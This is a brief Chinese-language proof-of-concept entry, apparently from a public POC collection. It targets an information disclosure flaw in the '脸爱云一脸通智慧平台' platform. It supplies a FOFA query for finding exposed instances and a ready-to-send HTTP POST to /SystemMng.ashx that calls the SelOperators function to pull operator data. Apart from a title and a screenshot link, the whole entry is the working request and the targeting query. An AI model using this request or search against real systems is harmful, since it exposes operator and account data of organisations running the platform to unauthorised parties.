## 脸爱云一脸通智慧平台SelOperators信息泄露漏洞

## fofa
```
body="View/UserReserved/UserReservedTest.aspx"
```

## poc
```
POST /SystemMng.ashx HTTP/1.1
Host: {{Hostname}}
Content-Length: 36
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin&funcName=SelOperators
```

![3eaa4e853a17b1795bf485fb1cc1a852](https://github.com/wy876/POC/assets/139549762/846ddccb-4df2-4a8a-a3b0-e51ecb15a65d)
